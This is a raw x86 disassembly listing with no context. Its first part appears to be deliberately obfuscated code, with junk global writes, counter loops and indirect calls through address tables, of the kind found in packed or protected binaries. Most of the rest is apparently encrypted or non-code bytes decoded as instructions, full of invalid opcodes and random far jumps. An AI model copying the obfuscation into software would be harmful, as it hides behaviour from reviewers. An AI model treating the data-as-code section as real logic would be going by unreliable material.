  40c9d1:	sub    DWORD PTR ds:0x42b00c,0x42c010
  40c9db:	add    edi,edx
  40c9dd:	mov    DWORD PTR ds:0x429010,0x673c
  40c9e7:	cmp    DWORD PTR [eax],edi
  40c9e9:	je     0x40c9f6
  40c9ef:	mov    eax,DWORD PTR [eax]
  40c9f1:	jmp    0x40f0dc
  40c9f6:	mov    eax,DWORD PTR [ebp+0x18]
  40c9f9:	mov    DWORD PTR ds:0x42b01c,0x6325
  40ca03:	cmp    eax,esi
  40ca05:	jne    0x40ca1f
  40ca0b:	push   0xf89c85b8
  40ca10:	mov    DWORD PTR ds:0x42b00c,0x25aa
  40ca1a:	jmp    0x40f0cb
  40ca1f:	mov    esi,0x6599
  40ca24:	mov    esi,DWORD PTR [ebp+0x18]
  40ca27:	mov    eax,0xf89c85bb
  40ca2c:	mov    DWORD PTR ds:0x42d00c,0x595f
  40ca36:	cmp    esi,eax
  40ca38:	mov    DWORD PTR ds:0x42a008,0x11a1
  40ca42:	jne    0x40f0bb
  40ca48:	add    eax,DWORD PTR ds:0x42b004
  40ca4e:	mov    eax,DWORD PTR [ebp+0x10]
  40ca51:	xor    eax,ecx
  40ca53:	add    eax,edx
  40ca55:	and    DWORD PTR ds:0x429014,0x0
  40ca5f:	jmp    0x40ca71
  40ca64:	mov    esi,DWORD PTR ds:0x429014
  40ca6a:	inc    esi
  40ca6b:	mov    DWORD PTR ds:0x429014,esi
  40ca71:	cmp    DWORD PTR ds:0x429014,0x16
  40ca78:	jae    0x40caa5
  40ca7e:	cmp    DWORD PTR ds:0x429014,0x1b
  40ca85:	jne    0x40ca9e
  40ca8b:	push   DWORD PTR [ebp-0x28]
  40ca8e:	push   0x429018
  40ca93:	push   0x4f77
  40ca98:	call   DWORD PTR ds:0x42ec9f
  40ca9e:	jmp    0x40ca64
  40caa3:	not    esi
  40caa5:	mov    DWORD PTR [ebp-0x18],eax
  40caa8:	sub    DWORD PTR ds:0x429014,ecx
  40caae:	mov    eax,DWORD PTR [ebp+0xc]
  40cab1:	mov    esi,DWORD PTR ds:0x429008
  40cab7:	or     DWORD PTR ds:0x429028,esi
  40cabd:	mov    esi,DWORD PTR [ebp-0x8]
  40cac0:	xor    eax,ecx
  40cac2:	add    eax,edx
  40cac4:	adc    DWORD PTR ds:0x42a000,0x42a00c
  40cace:	imul   eax,DWORD PTR [esi]
  40cad1:	and    DWORD PTR ds:0x42d004,0x0
  40cadb:	mov    esi,DWORD PTR ds:0x42d004
  40cae1:	inc    esi
  40cae2:	mov    DWORD PTR ds:0x42d004,esi
  40cae8:	cmp    DWORD PTR ds:0x42d004,0x5
  40caef:	jne    0x40cb08
  40caf5:	push   0x42e0b3
  40cafa:	push   0x42e127
  40caff:	push   DWORD PTR [ebp-0x24]
  40cb02:	call   DWORD PTR ds:0x42eca7
  40cb08:	cmp    DWORD PTR ds:0x42d004,0x4
  40cb0f:	jne    0x40cb22
  40cb15:	mov    esi,DWORD PTR ds:0x42d004
  40cb1b:	inc    esi
  40cb1c:	mov    DWORD PTR ds:0x42d004,esi
  40cb22:	cmp    DWORD PTR ds:0x42d004,0x14
  40cb29:	jb     0x40cadb
  40cb2f:	mov    esi,DWORD PTR [ebp+0x8]
  40cb32:	and    DWORD PTR ds:0x42b008,0x408f
  40cb3c:	xor    esi,ecx
  40cb3e:	add    esi,edx
  40cb40:	cmp    esi,eax
  40cb42:	mov    DWORD PTR ds:0x42a000,0x45f2
  40cb4c:	mov    eax,DWORD PTR [ebp-0x4]
  40cb4f:	mov    DWORD PTR ds:0x429010,0x639a
  40cb59:	push   ebx
  40cb5a:	mov    DWORD PTR ds:0x429004,0x7615
  40cb64:	je     0x40cbb2
  40cb6a:	sub    esi,DWORD PTR ds:0x42c01c
  40cb70:	mov    esi,DWORD PTR [ebp-0x18]
  40cb73:	add    DWORD PTR [eax],esi
  40cb75:	dec    eax
  40cb76:	mov    eax,DWORD PTR [ebp-0x4]
  40cb79:	mov    esi,DWORD PTR [ebp+0xc]
  40cb7c:	adc    DWORD PTR ds:0x42c014,0x3307
  40cb86:	xor    esi,ecx
  40cb88:	add    DWORD PTR ds:0x42d004,0x3241
  40cb92:	add    esi,edx
  40cb94:	sub    DWORD PTR ds:0x42900c,0x6cc3
  40cb9e:	imul   esi,DWORD PTR [eax]
  40cba1:	mov    DWORD PTR ds:0x429000,0x39ad
  40cbab:	mov    DWORD PTR [eax],esi
  40cbad:	jmp    0x40cbb7
  40cbb2:	mov    esi,DWORD PTR [ebp+0x14]
  40cbb5:	xor    DWORD PTR [eax],esi
  40cbb7:	mov    eax,DWORD PTR [ebp-0x4]
  40cbba:	mov    edi,DWORD PTR [ebp+0x10]
  40cbbd:	xor    edi,ecx
  40cbbf:	mov    esi,0xffcd8d20
  40cbc4:	mov    ebx,esi
  40cbc6:	sub    ebx,edi
  40cbc8:	add    DWORD PTR [eax],ebx
  40cbca:	mov    eax,DWORD PTR [ebp-0x4]
  40cbcd:	mov    edi,DWORD PTR [ebp-0x8]
  40cbd0:	add    edi,DWORD PTR [eax]
  40cbd2:	mov    DWORD PTR [ebp-0x8],edi
  40cbd5:	mov    eax,DWORD PTR [ebp+0xc]
  40cbd8:	mov    edi,DWORD PTR [ebp+0xc]
  40cbdb:	xor    edi,ecx
  40cbdd:	xor    eax,ecx
  40cbdf:	lea    eax,[eax+edi*1+0x64e5c0]
  40cbe6:	mov    edi,DWORD PTR [ebp+0xc]
  40cbe9:	xor    edi,ecx
  40cbeb:	add    edi,edx
  40cbed:	imul   eax,edi
  40cbf0:	mov    edi,DWORD PTR [ebp+0xc]
  40cbf3:	xor    edi,ecx
  40cbf5:	sub    edi,eax
  40cbf7:	mov    eax,DWORD PTR [ebp-0x4]
  40cbfa:	add    edi,edx
  40cbfc:	cmp    DWORD PTR [eax],edi
  40cbfe:	mov    eax,DWORD PTR [ebp-0x4]
  40cc01:	mov    edi,DWORD PTR [ebp+0x10]
  40cc04:	jg     0x40cc17
  40cc0a:	xor    edi,ecx
  40cc0c:	mov    ebx,esi
  40cc0e:	sub    ebx,edi
  40cc10:	add    DWORD PTR [eax],ebx
  40cc12:	jmp    0x40cc1d
  40cc17:	xor    edi,ecx
  40cc19:	add    edi,edx
  40cc1b:	add    DWORD PTR [eax],edi
  40cc1d:	mov    eax,DWORD PTR [ebp-0x8]
  40cc20:	mov    edi,DWORD PTR [ebp-0x10]
  40cc23:	mov    eax,DWORD PTR [eax]
  40cc25:	xor    edi,ecx
  40cc27:	add    edi,0x3272df
  40cc2d:	jmp    0x40efd7
  40cc32:	xchg   ebx,eax
  40cc33:	rol    BYTE PTR [ebx+ebx*8-0x5],0xdb
  40cc38:	jae    0x40cbba
  40cc3a:	fs lock inc edx
  40cc3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc3e:	jg     0x40cc6b
  40cc40:	sbb    ebp,eax
  40cc42:	(bad)  
  40cc44:	jp     0x40ccc0
  40cc46:	in     eax,0x5f
  40cc48:	jp     0x40ccc4
  40cc4a:	ins    DWORD PTR es:[edi],dx
  40cc4b:	pop    ds
  40cc4c:	inc    eax
  40cc4d:	sub    dh,BYTE PTR [ebp+0x69]
  40cc50:	add    ah,0xf6
  40cc53:	xchg   esi,eax
  40cc54:	das    
  40cc55:	repz pop eax
  40cc57:	ins    DWORD PTR es:[edi],dx
  40cc58:	leave  
  40cc59:	pop    esp
  40cc5a:	cmp    DWORD PTR [ebx-0x3e],ecx
  40cc5d:	in     al,0xca
  40cc5f:	repz and esi,eax
  40cc62:	adc    eax,0x8e96baf9
  40cc67:	and    al,0xb0
  40cc69:	xor    eax,0x6200db5b
  40cc6e:	jbe    0x40cc9b
  40cc70:	push   edx
  40cc71:	in     eax,dx
  40cc72:	jns    0x40cc70
  40cc74:	test   WORD PTR ds:0x1434ca58,si
  40cc7b:	or     BYTE PTR [esp+edx*2-0x52],bl
  40cc7f:	mov    ecx,eax
  40cc81:	and    ch,BYTE PTR [ecx]
  40cc83:	jl     0x40cc9d
  40cc85:	pop    edi
  40cc86:	lahf   
  40cc87:	xor    BYTE PTR [ebx],ch
  40cc89:	pop    ebp
  40cc8a:	test   DWORD PTR [esi-0x14737eea],edx
  40cc90:	shl    ebp,cl
  40cc92:	mov    cl,0x9a
  40cc94:	mov    eax,0x578ee5b5
  40cc99:	sbb    BYTE PTR [ebp-0x20],cl
  40cc9c:	push   esi
  40cc9d:	mov    al,0x7
  40cc9f:	lock mov BYTE PTR [esi+ecx*2+0x73],0x32
  40cca5:	inc    ecx
  40cca6:	mov    bl,0xaa
  40cca8:	lds    ecx,FWORD PTR [edi+0x36]
  40ccab:	dec    ebp
  40ccac:	mov    al,ds:0xf2ed0826
  40ccb1:	mov    ecx,0x801450e3
  40ccb6:	add    bh,bl
  40ccb8:	js     0x40cc83
  40ccba:	fst    DWORD PTR [ebx]
  40ccbc:	xchg   ebx,eax
  40ccbd:	mov    bh,0xcb
  40ccbf:	stc    
  40ccc0:	loop   0x40cc76
  40ccc2:	stos   BYTE PTR es:[edi],al
  40ccc3:	out    dx,al
  40ccc4:	dec    ecx
  40ccc5:	and    eax,0xae493f42
  40ccca:	les    esi,FWORD PTR [eax]
  40cccc:	and    ah,BYTE PTR [esi+0x65]
  40cccf:	js     0x40ccc3
  40ccd1:	xchg   edx,eax
  40ccd2:	cmp    dl,BYTE PTR [eax-0x48]
  40ccd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ccd6:	jmp    0xc53dbf6a
  40ccdb:	loope  0x40cd2f
  40ccdd:	into   
  40ccde:	in     al,0x9b
  40cce0:	xor    eax,0x57f3a4fe
  40cce5:	cmp    DWORD PTR [ecx],edx
  40cce7:	push   es
  40cce8:	pop    edx
  40cce9:	jb     0x40ccc1
  40cceb:	or     ebp,DWORD PTR [bx+di+0x4798]
  40ccf0:	stc    
  40ccf1:	xlat   BYTE PTR ds:[ebx]
  40ccf2:	jl     0x40cd12
  40ccf4:	xchg   edx,eax
  40ccf5:	neg    edx
  40ccf7:	(bad)  
  40ccf9:	int    0xd6
  40ccfb:	pop    edx
  40ccfc:	pop    esp
  40ccfd:	xchg   ebp,eax
  40ccfe:	mov    edi,0x6f020225
  40cd03:	pop    esi
  40cd04:	test   BYTE PTR [esi],0x54
  40cd07:	daa    
  40cd08:	sub    DWORD PTR [edi+0x7a704ca1],esi
  40cd0e:	fwait
  40cd0f:	(bad)
  40cd13:	imul   edi,DWORD PTR [eax+0x59d654f6],0xd86dfa6c
  40cd1d:	jnp    0x40ccf2
  40cd1f:	jmp    0xa8bd:0x62f711e8
  40cd26:	out    0x58,al
  40cd28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd29:	xor    DWORD PTR [eax-0x12b1f5ad],ebx
  40cd2f:	mov    ch,0x8a
  40cd31:	pop    edx
  40cd32:	cs or  eax,0x70071e79
  40cd38:	mov    edx,edi
  40cd3a:	pop    ebp
  40cd3b:	mov    ds:0x192a12fa,eax
  40cd40:	pushf  
  40cd41:	ret    0x3f00
  40cd44:	inc    eax
  40cd45:	imul   ebp,DWORD PTR [ecx],0xd0181091
  40cd4b:	(bad)
  40cd4f:	ds sub eax,0xb9163a6
  40cd55:	adc    al,0x81
  40cd57:	jne    0x40cd4f
  40cd59:	xor    dl,bl
  40cd5b:	and    al,0xf5
  40cd5d:	cmp    DWORD PTR ds:0xce1ef077,esi
  40cd63:	mov    BYTE PTR [edi-0x7ae1a788],ah
  40cd69:	arpl   ax,sp
  40cd6b:	add    al,0x34
  40cd6d:	adc    eax,0x7f22495
  40cd72:	mov    edi,0xaffa6086
  40cd77:	dec    ecx
  40cd78:	and    DWORD PTR [ecx],eax
  40cd7a:	and    ebx,edi
  40cd7c:	ds out 0x2a,al
  40cd7f:	pop    esp
  40cd80:	pushf  
  40cd81:	test   al,cl
  40cd83:	sub    BYTE PTR [eax-0x36dfc479],0x93
  40cd8a:	sbb    BYTE PTR [ebx+ebp*2+0x5b],bl
  40cd8e:	jp     0x40ce06
  40cd90:	mov    bl,0x19
  40cd92:	push   ecx
  40cd93:	ja     0x40cd47
  40cd95:	or     BYTE PTR [eax],ah
  40cd97:	jae    0x40cd1e
  40cd99:	or     al,0xaf
  40cd9b:	sbb    ah,dl
  40cd9d:	adc    cl,BYTE PTR [ecx]
  40cd9f:	neg    BYTE PTR [ebx+0x50]
  40cda2:	push   esp
  40cda3:	cdq    
  40cda4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cda5:	mov    ds:0x55dd9dcc,eax
  40cdaa:	jae    0x40cddf
  40cdac:	in     al,dx
  40cdad:	pop    edi
  40cdae:	outs   dx,BYTE PTR ds:[esi]
  40cdaf:	and    eax,0x240abc20
  40cdb4:	cmp    al,0x5
  40cdb6:	jg     0x40cd81
  40cdb8:	mov    WORD PTR [esi+0x65],?
  40cdbb:	xchg   edi,eax
  40cdbc:	daa    
  40cdbd:	scas   eax,DWORD PTR es:[edi]
  40cdbe:	and    DWORD PTR ds:0xe03464dc,esp
  40cdc4:	pop    ebx
  40cdc5:	(bad)  
  40cdc6:	push   ds
  40cdc7:	icebp  
  40cdc8:	test   DWORD PTR [ecx-0x75],edi
  40cdcb:	loope  0x40cd53
  40cdcd:	add    al,0x5b
  40cdcf:	xor    dh,BYTE PTR [esi+0x13]
  40cdd2:	in     eax,dx
  40cdd3:	ficom  WORD PTR [eax]
  40cdd5:	fadd   st(0),st
  40cdd7:	adc    DWORD PTR ss:[ebp-0x15],0x4c481624
  40cddf:	sbb    al,0xc3
  40cde1:	mov    eax,0x54791087
  40cde6:	xchg   esi,eax
  40cde7:	mov    ds:0x469ae4ad,eax
  40cdec:	ja     0x40cdde
  40cdee:	jl     0x40ce4c
  40cdf0:	cmp    al,0x51
  40cdf2:	cld    
  40cdf3:	push   ecx
  40cdf4:	push   eax
  40cdf5:	arpl   WORD PTR [esi-0x9],cx
  40cdf8:	lods   eax,DWORD PTR ds:[esi]
  40cdf9:	adc    ebp,DWORD PTR [edi]
  40cdfb:	std    
  40cdfc:	out    dx,al
  40cdfd:	jbe    0x40ce54
  40cdff:	adc    BYTE PTR [edx+0x15ac85d0],dl
  40ce05:	add    eax,DWORD PTR ds:0xda1168bf
  40ce0b:	ins    BYTE PTR es:[edi],dx
  40ce0c:	inc    BYTE PTR [edx+ebx*4-0x1]
  40ce10:	std    
  40ce11:	cmp    esi,ebp
  40ce13:	inc    esi
  40ce14:	xchg   edi,eax
  40ce15:	cld    
  40ce16:	bound  edi,QWORD PTR [edx+0x2b474edd]
  40ce1c:	jae    0x40ce22
  40ce1e:	inc    edi
  40ce1f:	ds enter 0x66ec,0x84
  40ce24:	bnd je 0x40ce2f
  40ce27:	jmp    0xc02ed5b1
  40ce2c:	sbb    bh,BYTE PTR ds:0x682953c1
  40ce32:	ds pop ss
  40ce34:	out    0x53,eax
  40ce36:	inc    ebp
  40ce37:	pusha  
  40ce38:	dec    eax
  40ce39:	jo     0x40cde6
  40ce3b:	in     eax,dx
  40ce3c:	test   al,0xf6
  40ce3e:	call   0x9d6a9a3e
  40ce43:	or     eax,0x1972f9d4
  40ce48:	int    0x3e
  40ce4a:	cmp    esp,ecx
  40ce4c:	or     DWORD PTR [eax-0x2b],eax
  40ce4f:	sub    eax,0x42a883b
  40ce54:	aaa    
  40ce55:	jp     0x40cdec
  40ce57:	mov    esi,0x40c21ad2
  40ce5c:	hlt    
  40ce5d:	leave  
  40ce5e:	ss imul eax,edi,0xe4a5d024
  40ce65:	sub    cl,BYTE PTR [esi+ecx*2-0x6b972107]
  40ce6c:	jl     0x40cdf7
  40ce6e:	imul   ebx,DWORD PTR [edx+esi*8],0xffffff80
  40ce72:	mov    bh,0x74
  40ce74:	ins    BYTE PTR es:[edi],dx
  40ce75:	cmp    al,0xd7
  40ce77:	mov    ds:0x2d2913fb,eax
  40ce7c:	sbb    al,0x3d
  40ce7e:	push   ebp
  40ce7f:	pop    edx
  40ce80:	xlat   BYTE PTR ds:[ebx]
  40ce81:	pop    edx
  40ce82:	pop    edi
  40ce83:	push   esp
  40ce84:	rol    DWORD PTR [edi],1
  40ce86:	inc    esi
  40ce87:	push   ds
  40ce88:	add    al,0x4d
  40ce8a:	push   esp
  40ce8b:	cmp    ecx,ebp
  40ce8d:	mov    ds:0xbdf9b0c6,al
  40ce92:	nop
  40ce93:	adc    al,0xd3
  40ce95:	xor    bh,al
  40ce97:	mov    ah,bl
  40ce99:	rol    DWORD PTR [ecx+0x38],cl
  40ce9c:	cdq    
  40ce9d:	dec    esi
  40ce9e:	pop    edi
  40ce9f:	sbb    esi,edx
  40cea1:	sub    esp,edi
  40cea3:	add    dx,WORD PTR [ecx]
  40cea6:	and    BYTE PTR [esi+0x379485e1],0x4c
  40cead:	cmp    eax,0x12b915ea
  40ceb2:	xchg   ebx,eax
  40ceb3:	hlt    
  40ceb4:	ins    DWORD PTR es:[edi],dx
  40ceb5:	dec    eax
  40ceb6:	pop    esi
  40ceb7:	xor    DWORD PTR [esp+eiz*8],esp
  40ceba:	in     al,0x3f
  40cebc:	or     BYTE PTR [edi-0x2b],dl
  40cebf:	shr    BYTE PTR [eax+0x26],cl
  40cec2:	fcomip st,st(0)
  40cec4:	mov    ch,0xa5
  40cec6:	ficom  DWORD PTR [esi]
  40cec8:	test   BYTE PTR [edi],dh
  40ceca:	imul   ebx,edx,0x24
  40cecd:	fldenv [edi+0x7910c393]
  40ced3:	ins    DWORD PTR es:[edi],dx
  40ced4:	sub    al,0xd1
  40ced6:	outs   dx,BYTE PTR ds:[esi]
  40ced7:	(bad)  
  40ced8:	aas    
  40ced9:	retf   0xac36
  40cedc:	add    BYTE PTR [edi+0x48],bh
  40cedf:	popf   
  40cee0:	cmp    DWORD PTR [eax-0x35c5d469],esp
  40cee6:	fdivr  DWORD PTR [edx+esi*4+0x2fac43f9]
  40ceed:	mov    edi,DWORD PTR [ecx+edx*8-0x2f312c16]
  40cef4:	sbb    BYTE PTR [eax+ecx*8+0x65],0x11
  40cef9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cefa:	out    dx,al
  40cefb:	daa    
  40cefc:	data16 mov ds:0x96fbcfac,al
  40cf02:	push   esi
  40cf03:	jge    0x40cecf
  40cf05:	mov    ch,0xcf
  40cf07:	scas   al,BYTE PTR es:[edi]
  40cf08:	jbe    0x40cec3
  40cf0a:	cld    
  40cf0b:	shl    DWORD PTR [edx+0x44],1
  40cf0e:	jbe    0x40cf8d
  40cf10:	inc    esp
  40cf11:	nop
  40cf12:	push   0x54
  40cf14:	mov    dl,0xb8
  40cf16:	mov    eax,ds:0xedaed13c
  40cf1b:	push   ds
  40cf1c:	rcr    BYTE PTR [edx+0x8],0x50
  40cf20:	and    eax,0x64112a
  40cf25:	pop    esp
  40cf26:	and    ah,BYTE PTR [ecx]
  40cf28:	inc    esi
  40cf29:	adc    ebp,DWORD PTR [edx-0x1]
  40cf2c:	jnp    0x40cf2d
  40cf2e:	mov    edi,DWORD PTR ds:0xcce47c00
  40cf34:	fcomp  DWORD PTR [edx]
  40cf36:	adc    ah,BYTE PTR [ebx-0x7]
  40cf39:	daa    
  40cf3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf3b:	or     BYTE PTR [esi+0xd],cl
  40cf3e:	adc    al,0x24
  40cf40:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf42:	push   ds
  40cf43:	jmp    0x7af4:0x96360d5
  40cf4a:	xor    al,0x51
  40cf4c:	cdq    
  40cf4d:	xchg   esp,eax
  40cf4e:	imul   ebp,DWORD PTR [ecx+0x74],0x4
  40cf52:	dec    edi
  40cf53:	out    dx,eax
  40cf54:	daa    
  40cf55:	push   eax
  40cf56:	xchg   BYTE PTR [ebp+0x1592d6a3],cl
  40cf5c:	outs   dx,DWORD PTR ds:[esi]
  40cf5d:	xor    eax,0xdae3745f
  40cf62:	(bad)  
  40cf63:	leave  
  40cf64:	pop    ecx
  40cf65:	(bad)  
  40cf66:	fst    DWORD PTR [ecx-0x1b5b6cbd]
  40cf6c:	daa    
  40cf6d:	jnp    0x40cf4b
  40cf6f:	ins    DWORD PTR es:[edi],dx
  40cf70:	js     0x40cf77
  40cf72:	jle    0x40cf6b
  40cf74:	push   0x20
  40cf76:	popa   
  40cf77:	mov    ah,0x3
  40cf79:	in     eax,0x6d
  40cf7b:	fs xchg esp,eax
  40cf7d:	xor    esp,ebp
  40cf7f:	mov    al,0x22
  40cf81:	pushf  
  40cf82:	cwde   
  40cf83:	adc    ebp,ebp
  40cf85:	inc    edi
  40cf86:	iret   
  40cf87:	es clc 
  40cf89:	pop    edi
  40cf8a:	mov    ebx,0x2f0ab113
  40cf8f:	lods   al,BYTE PTR ds:[esi]
  40cf90:	add    ecx,esp
  40cf92:	enter  0x9336,0x24
  40cf96:	xor    BYTE PTR [eax],ah
  40cf98:	ror    DWORD PTR [ecx+ebx*8+0x5c],1
  40cf9c:	fistp  DWORD PTR [ecx+ecx*8-0x71760130]
  40cfa3:	ins    BYTE PTR es:[edi],dx
  40cfa4:	outs   dx,DWORD PTR ds:[esi]
  40cfa5:	lds    eax,FWORD PTR [eax]
  40cfa7:	dec    BYTE PTR [edx-0x66]
  40cfaa:	inc    eax
  40cfab:	out    0x56,eax
  40cfad:	jbe    0x40cf38
  40cfaf:	mov    edi,0xc669cb3b
  40cfb4:	sub    al,0x7e
  40cfb6:	dec    ebx
  40cfb7:	or     DWORD PTR [edx-0x1f],edi
  40cfba:	jnp    0x40cfed
  40cfbc:	or     ebx,DWORD PTR [ebx]
  40cfbe:	adc    ebx,DWORD PTR [edi+0xe]
  40cfc1:	push   ebx
  40cfc2:	mov    ebx,0x53730fca
  40cfc7:	rcr    esi,cl
  40cfc9:	cmp    dl,dl
  40cfcb:	xchg   esp,eax
  40cfcc:	mov    ds:0xac537e58,eax
  40cfd1:	shl    DWORD PTR [esi+ecx*4-0x37ebb4ab],cl
  40cfd8:	cmp    eax,0xd78d8fe5
  40cfdd:	and    al,0x1b
  40cfdf:	imul   esi,DWORD PTR ds:0x270fd0c1,0x56427b62
  40cfe9:	addr16 jno 0x40cf6e
  40cfec:	mov    ebp,0x49822dd5
  40cff1:	push   0xffffffee
  40cff3:	push   esp
  40cff4:	mov    ds:0xc0636dff,al
  40cff9:	jg     0x40d044
  40cffb:	xor    BYTE PTR [ecx*2-0x3fd5d1d],cl
  40d002:	pop    ebp
  40d003:	mov    eax,ds:0x17f3e78d
  40d008:	sbb    esi,DWORD PTR [ecx+0x48]
  40d00b:	lods   eax,DWORD PTR ds:[esi]
  40d00c:	je     0x40d020
  40d00e:	aad    0xbc
  40d010:	lahf   
  40d011:	mov    eax,ds:0x27e2d0a
  40d016:	jo     0x40d093
  40d018:	in     eax,0x55
  40d01a:	dec    BYTE PTR [eax]
  40d01c:	mov    BYTE PTR [esi+0x2acfe94a],cl
  40d022:	cmc    
  40d023:	cmp    DWORD PTR [esi-0x606b29b1],edx
  40d029:	mov    esp,0x5212fbf5
  40d02e:	jl     0x40cff8
  40d030:	jbe    0x40d025
  40d032:	cdq    
  40d033:	daa    
  40d034:	adc    al,0xe0
  40d036:	test   al,0x7
  40d038:	cmp    BYTE PTR [edi-0x3085c40f],al
  40d03e:	(bad)  ds:0xb9fff3a3
  40d044:	and    eax,0xb1c32e7c
  40d049:	pushf  
  40d04a:	in     eax,dx
  40d04b:	sti    
  40d04c:	pop    eax
  40d04d:	enter  0x5e48,0x8
  40d051:	(bad)  
  40d052:	mov    ecx,0x4a1302fe
  40d057:	sub    al,0xd6
  40d059:	jno    0x40d057
  40d05b:	aad    0x69
  40d05d:	repnz dec ebx
  40d05f:	and    BYTE PTR ds:0x1e78886b,bl
  40d065:	xchg   esi,eax
  40d066:	mov    eax,ds:0x37f1f1fe
  40d06b:	mov    ds:0x296b7302,eax
  40d070:	mov    esi,0x22aa0b13
  40d075:	xor    dh,BYTE PTR [ebx+0x6]
  40d078:	jmp    0xe76b:0xf25833ad
  40d07f:	add    dh,BYTE PTR [edx-0x7b]
  40d082:	sub    eax,0x32f42879
  40d087:	or     ah,cl
  40d089:	jb     0x40d032
  40d08b:	dec    eax
  40d08c:	aam    0x1a
  40d08e:	stos   BYTE PTR es:[edi],al
  40d08f:	lods   eax,DWORD PTR ds:[esi]
  40d090:	xor    eax,0xf355c10b
  40d095:	pop    ss
  40d096:	push   cs
  40d097:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d098:	push   es
  40d099:	(bad)  
  40d09b:	xchg   edi,eax
  40d09c:	nop
  40d09d:	push   es
  40d09e:	out    0x70,eax
  40d0a0:	adc    dl,BYTE PTR [ecx]
  40d0a2:	or     bh,bh
  40d0a4:	call   0xfb2270f7
  40d0a9:	cli    
  40d0aa:	into   
  40d0ab:	rcl    al,1
  40d0ad:	sbb    DWORD PTR [eax-0x2],esp
  40d0b0:	push   0xffffffcc
  40d0b2:	clc    
  40d0b3:	push   edi
  40d0b4:	push   ds
  40d0b5:	push   ss
  40d0b6:	int    0xc7
  40d0b8:	mov    bh,0xf4
  40d0ba:	rcl    DWORD PTR [edi],1
  40d0bc:	test   eax,edi
  40d0be:	cmp    ch,dl
  40d0c0:	cmp    BYTE PTR [ecx+ebx*2+0x6c52fc61],dh
  40d0c7:	lods   eax,DWORD PTR ds:[esi]
  40d0c8:	sub    ah,BYTE PTR [edi-0x2a518241]
  40d0ce:	scas   eax,DWORD PTR es:[edi]
  40d0cf:	sbb    eax,0x38cb55f7
  40d0d4:	and    dh,BYTE PTR [ecx+0x7d]
  40d0d7:	icebp  
  40d0d8:	sbb    eax,0xbfe76f1b
  40d0dd:	gs in  al,dx
  40d0df:	movlps xmm3,QWORD PTR [ebp+eiz*2-0x6ed83d00]
  40d0e7:	and    esp,DWORD PTR [edx]
  40d0e9:	and    cl,0x9a
  40d0ec:	fild   WORD PTR [edi]
  40d0ee:	repnz mov esi,0xd385dd96
  40d0f4:	mov    eax,0x779d45d1
  40d0f9:	shl    DWORD PTR [eax-0x65a99168],1
  40d0ff:	dec    edi
  40d100:	pop    ebp
  40d101:	mov    ebp,0x8d67d947
  40d106:	pop    ebx
  40d107:	retf   0xf2c5
  40d10a:	retf   0xb402
  40d10d:	fs mov ecx,ebx
  40d110:	dec    edi
  40d111:	loop   0x40d15e
  40d113:	lock xlat BYTE PTR ds:[ebx]
  40d115:	jae    0x40d14a
  40d117:	add    DWORD PTR [edi],esi
  40d119:	cmp    DWORD PTR [ecx+0x34],ebp
  40d11c:	(bad)  
  40d11d:	pop    edx
  40d11e:	xchg   ebx,eax
  40d11f:	mov    ecx,0xa3a46ca8
  40d124:	sahf   
  40d125:	mov    esi,0xbde55682
  40d12a:	xlat   BYTE PTR ds:[ebx]
  40d12b:	cmp    eax,0x5b569dce
  40d130:	cmp    al,0xd3
  40d132:	(bad)  
  40d133:	fidiv  DWORD PTR [edx+edx*4+0x2126fef6]
  40d13a:	inc    eax
  40d13b:	dec    ebp
  40d13c:	fnsave [edx]
  40d13e:	dec    eax
  40d13f:	mov    bh,0x23
  40d141:	or     bh,cl
  40d143:	push   0x648be790
  40d148:	lods   eax,DWORD PTR ds:[esi]
  40d149:	popa   
  40d14a:	out    0x70,eax
  40d14c:	je     0x40d171
  40d14e:	cmp    bl,BYTE PTR [eax-0x7c277bbc]
  40d154:	(bad)  
  40d155:	xor    edi,DWORD PTR [ebx+0x4c8e9779]
  40d15b:	dec    esi
  40d15c:	es pop ebx
  40d15e:	iret   
  40d15f:	mov    eax,ds:0xb019f561
  40d164:	stos   DWORD PTR es:[edi],eax
  40d165:	sbb    cl,BYTE PTR [ebp-0x30]
  40d168:	(bad)  
  40d169:	pop    edx
  40d16a:	push   es
  40d16b:	sbb    eax,0x4162847f
  40d170:	icebp  
  40d171:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d172:	sub    dh,bl
  40d174:	and    ebx,edx
  40d176:	pop    ss
  40d177:	les    edi,FWORD PTR [ecx+0xb]
  40d17a:	mov    cl,0x2f
  40d17c:	xor    DWORD PTR [ebx-0x4f],0xffffffcf
  40d180:	xor    ebp,edi
  40d182:	fwait
  40d183:	inc    eax
  40d184:	ret    0xb5ce
  40d187:	pop    edi
  40d188:	sbb    al,0x8e
  40d18a:	lahf   
  40d18b:	outs   dx,DWORD PTR ds:[esi]
  40d18c:	push   cs
  40d18d:	daa    
  40d18e:	jo     0x40d1c3
  40d190:	cmp    eax,0x64a47a9
  40d195:	rol    dl,1
  40d197:	sbb    al,BYTE PTR [edx+0x1a]
  40d19a:	xchg   edx,eax
  40d19b:	push   cs
  40d19c:	mov    ch,0x80
  40d19e:	fdivp  st(6),st
  40d1a0:	fs or  ah,0x25
  40d1a4:	push   eax
  40d1a5:	xor    eax,0x3a0ab091
  40d1aa:	outs   dx,DWORD PTR ds:[esi]
  40d1ab:	adc    al,0xc7
  40d1ad:	retf   
  40d1ae:	jno    0x40d168
  40d1b0:	cmp    BYTE PTR [eax],cl
  40d1b2:	cmc    
  40d1b3:	sar    edi,0x7e
  40d1b6:	cdq    
  40d1b7:	sbb    edi,esp
  40d1b9:	sbb    BYTE PTR [esi+edx*8-0x6b5e1da3],al
  40d1c0:	jo     0x40d1f4
  40d1c2:	aam    0x80
  40d1c4:	in     al,dx
  40d1c5:	cli    
  40d1c6:	lds    esp,FWORD PTR [ebx+0x1ff59c0]
  40d1cc:	xor    esi,DWORD PTR [eax+0x6f]
  40d1cf:	cli    
  40d1d0:	pop    es
  40d1d1:	push   eax
  40d1d2:	scas   al,BYTE PTR es:[edi]
  40d1d3:	jge    0x40d1c0
  40d1d5:	push   0xde0322f7
  40d1da:	jno    0x40d229
  40d1dc:	into   
